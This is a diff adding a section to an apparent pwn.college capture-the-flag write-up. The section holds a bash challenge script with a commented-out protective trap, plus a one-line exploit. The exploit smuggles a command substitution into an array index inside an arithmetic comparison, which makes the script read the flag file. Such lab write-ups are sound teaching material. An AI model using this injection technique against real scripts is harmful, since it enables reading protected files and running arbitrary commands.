@@ -446,3 +446,34 @@ fi
 ```sh
 /challenge/run CHALLENGE
 ```
+
+# The Commanded Condition
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+
+CHALLENGE=$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
+RESPONSE="$1"
+
+# Alright, go for it.
+#set -T
+#readonly BASH_SUBSHELL
+#trap '[[ $BASH_SUBSHELL -gt 0 ]] && exit' DEBUG
+
+if (( RESPONSE == CHALLENGE ))
+then
+	echo "Success!"
+	#cat /flag
+else
+	echo "Wrong!"
+	#cat /flag | md5sum
+fi
+```
+
+### exploit
+```sh
+/challenge/run "a[\$(</flag)]"
+```
